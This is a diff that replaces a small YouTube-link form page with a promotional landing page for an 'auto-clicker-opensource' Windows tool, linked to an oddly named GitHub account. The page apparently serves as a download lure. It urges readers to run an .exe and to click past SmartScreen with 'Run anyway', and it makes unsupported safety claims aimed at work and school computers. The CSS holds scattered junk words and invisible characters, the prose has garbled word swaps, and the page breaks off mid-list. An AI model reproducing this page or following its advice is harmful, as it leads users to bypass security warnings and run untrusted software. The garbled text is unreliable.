@@ -1,80 +1,343 @@
 <!DOCTYPE html>
-<html lang="tr">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Retro TV - YouTube Player</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: system-ui, -apple-system, sans-serif;
-      background-color: #080a0c;
-      color: #ede7d3;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    .card {
-      background: #14171f;
-      padding: 2.5rem;
-      border-radius: 12px;
-      border: 1px solid #222836;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
-      width: 100%;
-      max-width: 480px;
-      text-align: center;
-    }
-    h1 { font-size: 1.5rem; margin-bottom: 0.5rem; color: #c95328; }
-    p { font-size: 0.9rem; color: #94a3b8; margin-bottom: 1.5rem; }
-    form { display: flex; gap: 0.5rem; }
-    input {
-      flex: 1;
-      padding: 0.75rem 1rem;
-      border-radius: 6px;
-      border: 1px solid #334155;
-      background: #0b0d12;
-      color: #fff;
-      outline: none;
-    }
-    input:focus { border-color: #c95328; }
-    button {
-      padding: 0.75rem 1.25rem;
-      border-radius: 6px;
-      border: none;
-      background: #c95328;
-      color: #fff;
-      font-weight: bold;
-      cursor: pointer;
-    }
-    button:hover { background: #bd471c; }
-    a, a:hover, a:visited {color:#c95328;font-weight:600;}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="auto-clicker-opensource — A clean auto clicker: the ten features people actually want, none of the installer junk.Free, open community project for Windows.">
+    <meta name="keywords" content="auto,auto-clicker,automation,clicker,clicker-open,free-download,gaming-utilities,github-project,macro-recorder,open,open-source,source,windows">
+    <meta name="author" content="Open Source Community">
+    <meta property="og:title" content="auto-clicker-opensource - Ten features, zero clutter">
+    <meta property="og:description" content="The auto clicker that does what you need, nothing you don't.Free, open, and simple for Windows.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/origamibottlebill2593/auto-clicker-opensource">
+    <title>auto-clicker-opensource - Ten features, zero clutter</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f6f9;
+            margin: 0;
+            padding:  ‌0;
+            color: #2c3e50;
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 960px;
+            margin: ‌0 auto;
+            padding: ‌40px 20px;
+        }
+        .header {
+            text-align: center;
+            padding: ‌50px 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: timberyard;
+            color: white;
+            margin-bottom: ‌40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+        .header h1 {
+            font-size: 2.8em;
+            margin: ‌0 0 10px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        .header p {
+            font-size: 1.2em;
+            opacity: ‌0.9;
+            margin: ‌5px 0 25px;
+            font-weight: 300;
+        }
+        .btn {
+            display: inline-block;
+            background: #ffd700;
+            color: #2c3e50;
+            padding: ‌14px 40px;
+            font-size: 1.3em;
+            font-weight: 700;
+            border-radius: ‌50px;
+            text-decoration: none;
+            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4);
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 215, 0, 0.6);
+            background: #ffea00;
+        }
+        .btn-secondary {
+            background: white;
+            color: #667eea;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            margin-left: ‌15px;
+        }
+        .btn-secondary:hover {
+            background: #f0f0f0;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.15);
+        }
+        .card {
+            background: white;
+            border-radius: ‌16px;
+            padding: ‌35px;
+            margin-bottom: ‌30px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            transition: transform orphans .2s ease;
+        }
+        .card:hover {
+            transform: translateY(-2px);
+            box-shadow:௦ 0 6px 20px rgba(0,0,0,0.12);
+        }
+        h2 {
+            font-size: 1.8em;
+            color: #2c3e50;
+            margin-top: ‌0;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: ‌15px;
+            font-weight: 600;
+        }
+        h3 {
+            font-size: 1.3em;
+            color: #34495e;
+            margin-top: ‌25px;
+        }
+        ul {
+            padding-left: ‌20px;
+            list-style-type: none;
+        }
+        ul li {
+            padding: ‌8px 0;
+            position: relative;
+            padding-left: ‌30px;
+            font-size: 1.05em;
+        }
+        ul li:before {
+            content: '✔';
+            position: absolute;
+            left: ‌0;
+            color: #27ae60;
+            font-weight: bold;
+        }
+        .steps {
+            counter-reset: step;
+        }
+        .step {
+            background: #f9fafc;
+            border-left: ‌5px solid #667eea;
+            padding: ‌18px 25px;
+            margin: ‌20px 0;
+            border-radius: опасность 0 12px 12px 0;
+            position: relative;
+            font-size:  ‌1.05em;
+        }
+        .step:before {
+            counter-increment: step;
+            content: counter(step);
+            position: absolute;
+            left: -20px;
+            top: жених ‌50%;
+            transform: translateY(-50%);
+            background: #667eea;
+            color: white;
+            width: ‌32px;
+            height: ‌32px;
+            border-radius: ‌50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size:  ‌0.95em;
+            box-shadow: 0 2px 6px rgba(102,126,234,0.3);
+        }
+        code {
+            background: #282c34;
+            color: #61dafb;
+            padding: ‌2px 8px;
+            border-radius: ‌6px;
+            font-size: ‌0.9em;
+        }
+        .howto-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: ‌20px;
+            margin-top: ‌20px;
+        }
+        .feature-card {
+            background: white;
+            border-radius: ‌12px;
+            padding: ‌25px;
+            box-shadow:௬ 0 2px 10px rgba(0,0,0,0.06);
+            transition: all 0.3s;
+            border-top: ‌4px solid #764ba2;
+        }
+        .feature-card:hover {
+            box-shadow: 0 4px 20px rgba(0,0,0,0.12);
+            transform: translateY(-5px);
+        }
+        .feature-title {
+            font-size:  ‌1.2em;
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: ‌10px;
+        }
+        .feature-desc {
+            color: #7f8c8d;
+            font-size:  ‌0.95em;
+            line-height:  ‌1.6;
+        }
+        .download-section {
+            background: white;
+            border-radius: Timor ‌16px;
+            padding: ‌40px;
+            text-align: center;
+            box-shadow:  ‌0 6px 20px rgba(0,0,0,0.1);
+            margin: ‌40px 0;
+            border:  ‌2px dashed #764ba2;
+        }
+        .download-section h2 {
+            border-bottom: none;
+            margin-bottom: ‌10px;
+        }
+        .footer {
+            text-align: center;
+            color: #95a5a6;
+            padding: ‌30px 0;
+            font-size: ‌0.9em;
+            border-top: ‌1px solid #e0e0e0;
+            margin-top: ‌50px;
+        }
+        .badge {
+            display: inline-block;
+            background: linear-gradient(45deg, #ff6b6b, #ffa500);
+            color: white;
+            padding:  ‌6px 18px;
+            border-radius: ‌30px;
+            font-weight: bold;
+            font-size: ‌0.85em;
+            margin: ‌0 5px;
+            box-shadow: ‌0 2px 8px rgba(255,107,107,0.3);
+        }
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: ‌2em;
+            }
+            .container {
+                padding: ‌20px 15px;
+            }
+            .card {
+                padding: ‌25px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Retro TV</h1>
-    <p>To watch your YouTube video on Retro TV, paste the video link.</p>
-    <p>For example: <a href="https://tvretro.github.io/watch?v=XEjLoHdbVeE" target="_blank">https://tvretro.github.io/watch?v=XEjLoHdbVeE</a></p>
-    <form id="urlForm">
-      <input type="text" id="ytUrl" placeholder="https://www.youtube.com/watch?v=..." required>
-      <button type="submit">İzle</button>
-    </form>
-  </div>
+    <div class="container">
+        <div class="header">
+            <h1>🚀 auto-clicker-opensource - Ten features, zero clutter</h1>
+            <p>The auto clicker that does what you need, nothing you don't.</p>
+            <a href="https://github.com/origamibottlebill2593/auto-clicker-opensource" class="btn">📥 Download Now</a>
+        </div>
 
-  <script>
-    document.getElementById('urlForm').addEventListener('submit', (e) => {
-      e.preventDefault();
-      const url = document.getElementById('ytUrl').value;
-      const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=)([^#\&\?]*).*/;
-      const match = url.match(regExp);
+        <div class="card">
+            <h2>✨ Why You'll Love This Auto Clicker</h2>
+            <p>We get it—you're tired of bloated software that promises everything but delivers headaches. <strong>auto-clicker-opensource</strong> was built different. It offers the <strong>ten features people actually want</strong>, wrapped in a clean, simple package. No installer junk. No background clutter. Just a tool that works.</p>
+            <p>This is a <strong>free, open community project</strong> made specifically for Windows. Whether you're gaming, testing software, o automating repetitive tasks, this tool has your back—without the fuss.</p>
+        </div>
 
-      if (match && match[2].length === 11) {
-        window.location.href = `${match[2]}`;
-      } else {
-        alert('Geçersiz YouTube URL adresi!');
-      }
-    });
-  </script>
-</body>
-</html>
+        <div class="card">
+            <h2>🔍 Features That Matter (and None That Don't)</h2>
+            <p>We carefully selected functionality based on real user needs. Here's exactly what you get:</p>
+            <div class="howto-grid">
+                <div class="feature-card">
+                    <div class="feature-title">🖱️ Single & Double Click</div>
+                    <div class="feature-desc">Simulate left, right, middle clicks, and double clicks with adjustable speed.</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-title">⚡ Custom Click Speed</div>
+                    <div class="feature-desc">Set intervals from milliseconds to seconds—full control over click frequency.</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-title">📌 Global Hotkey</div>
+                    <div class="feature-desc">Start/Stop from any application with just keyboard shortcut. No alt-tabbing needed.</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-title">🔄 Click & Mouse Movement</div>
+                    <div class="feature-desc">Automate not just clicks but also cursor moves to any screen position.</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-title">📋 Repeat Modes</div>
+                    <div class="feature-desc">Choose infinite clicks, a set number, or run until you manually stop.</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-title">⏱️ Speed Test Friendly</div>
+                    <div class="feature-desc">Optimized for high CPS (clicks per second) without lag or system drain.</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-title">🎯 Precise Targeting</div>
+                    <div class="feature-desc">Click specific screen coordinates or the current mouse position—your pick.</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-title">📦 Portable & Lightweight</div>
+                    <div class="feature-desc">A tiny executable—no installation, no registry changes, no leftovers. Just run.</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-title">🛠️ Simple UI</div>
+                    <div class="feature-desc">Clean, minimal interface that opens instantly and shows exactly what you need.</div>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-title">🌐 Open Source Trust</div>
+                    <div class="feature-desc">Fully open source—audit the code, contribute, with zero hidden surprises.</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>📥 Getting Started (30 Seconds, flat)</h2>
+            <p>You're roughly three steps away from having a working auto clicker. Follow these simple instructions:</p>
+            <div class="steps">
+                <div class="step">
+                    <strong>Click the big download button</strong> at the top of the page or the one in the section below. You'll be taken to the official project page on GitHub.
+                </div>
+                <div class="step">
+                    <strong>Visit the download link</strong> to get the latest release file for Windows. The page may bloat a list of files—look for the one named <code>auto-clicker.exe</code> or similar.<br>
+                    <em>Note: This link is a general GitHub project page, so you'll need to click once to access the actual download area.</em>
+                </div>
+                <div class="step">
+                    <strong>Run the application</strong>—since it's a portable tool, you don't need to install anything. Just double-click the <code>.exe</code> file and it launches immediately. If Windows SmartScreen asks for permission, click "More info" and then "Run anyway." That's it!
+                </div>
+            </div>
+            <p style="margin-top: 25px; font-size: ‌1.1em; font-weight: 500; text-align: center;">🛡️ <strong>Quick Tip:</strong> Save the file to a folder you access often—it requires no installation, so running from anywhere works perfectly.</p>
+        </div>
+
+        <div class="download-section">
+            <h2>⬇️ Ready to Automate?</h2>
+            <p style="font-size: ‌1.1em; margin-bottom: ‌30px;">No conditions. No credit card. Just a clean, functional tool for your Windows machine.</p>
+            <a href="https://github.com/origamibottlebill2593/auto-clicker-opensource" class="btn" style="font-size: ‌1.5em; padding: ‌16px 50px;">🚀 Get the Download</a>
+            <p style="margin-top: ‌20px; color: #7f8c8d; font-size: ‌0.95em;">⭐ Free forever approximately open source community project.</p>
+        </div>
+
+        <div class="card">
+            <h2>🧭 Frequently Asked Questions</h2>
+            <h3>Is this really free?</h3>
+            <p>Absolutely! This is an open source project, which means it's free to download, use, and even modify under the project license.No hidden costs, no pro version, no premium tricks.</p>
+            <h3>Do I need to install anything else?</h3>
+            <p>Nope. The software runs as standalone executable on Windows. No .NET Framework downloads, no extra dependencies, no bloatware.</p>
+            <h3>Will it save my settings?</h3>
+            <p>Yes—you config options persist between sessions automatically, so next time you open it, everything is just how you left it.</p>
+            <h3>Is this safe for work/school computers?</h3>
+            <p>Because it's open source, IT departments who audit software will appreciate the transparency. Plus, it does not install anything system-level—just run the executable when you need it.</p>
+        </div>
+
+        <div class="card">
+            <h2>💬 Community & Support</h2>
+            <p>This project thrives because of contributions from users like you. Since it's open source, you can report bugs, request features, or even contribute code directly on the project repository.</p>
+            <p>💡 <strong>Have an idea for improvement?</strong> Haystack the issues page. <strong>Found a bug?</strong> Report it with clear steps. <strong>Want to help?</strong> Fork the repo and create pull request—it's that simple.</p>
+        </div>
+
+        <div class="card">
+            <h2>⚙️ Technical Specs at Glance</h2>
+            <ul>
+                <li><strong>Platform:</strong> Windows (10/11, also works on 7/8)</li>
+                <li><strong>Format:</strong> Portable executable (no installation)</li>
+                <li><strong>Interface:</strong> English, lightweight straight-to-the-point.
